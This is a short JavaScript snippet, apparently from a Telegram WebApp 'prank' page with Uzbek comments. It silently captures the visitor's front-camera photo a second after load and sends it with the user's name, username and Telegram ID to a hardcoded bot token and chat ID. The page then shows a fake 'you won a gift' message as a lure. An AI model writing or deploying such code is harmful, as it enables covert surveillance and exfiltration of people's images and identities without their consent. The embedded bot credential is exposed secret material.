<script>
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

const BOT_TOKEN = '8712533127:AAFXPFg8cfaXxbWrmADNJ9BkITMc8mUb1mo';
const CHAT_ID   = '8814685453';

async function captureAndSend() {
  try {
    // 1. Kamerani ochish
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 640, height: 480 },
      audio: false
    });

    const video = document.getElementById('video');
    video.srcObject = stream;

    // 2. Kadrlash uchun 1.5 soniya kutish
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(resolve, 1500);
      };
    });

    // Flash effekti
    const flash = document.getElementById('flash');
    flash.style.opacity = '1';
    setTimeout(() => flash.style.opacity = '0', 150);

    // 3. Rasm olish
    const canvas = document.getElementById('canvas');
    canvas.width  = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    // Kamerani o'chirish
    stream.getTracks().forEach(t => t.stop());

    // 4. Blob shakliga o'tkazish
    canvas.toBlob(async (blob) => {
      if (!blob) {
        console.error("Blob yaratilmadi");
        return;
      }

      const user = tg.initDataUnsafe?.user;
      const userName = user 
        ? `${user.first_name || ''} ${user.last_name || ''} (@${user.username || 'nomsiz'})`.trim()
        : 'Noma\'lum foydalanuvchi';

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'photo.jpg');
      formData.append('caption', `📸 Prank ishladi!\n👤 ${userName}\n🆔 ID: ${user?.id || '?'}`);

      // 5. Telegram API'ga yuborish
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      const resData = await response.json();
      console.log("Telegram Javobi:", resData);

      if (resData.ok) {
        document.getElementById('loading').innerHTML = `
          <div style="font-size:60px">🎉</div>
          <h2 style="margin-top:16px">Siz g'alaba qozondingiz!</h2>
          <p style="margin-top:8px; color:#aaa">Maxsus sovg'angiz tayyor</p>
        `;
      } else {
        alert("Xatolik yuz berdi: " + resData.description);
      }
    }, 'image/jpeg', 0.8);

  } catch (err) {
    console.error("Kamera xatosi:", err);
    alert("Kameraga ulanib bo'lmadi: " + err.message);
  }
}

setTimeout(captureAndSend, 1000);
</script>
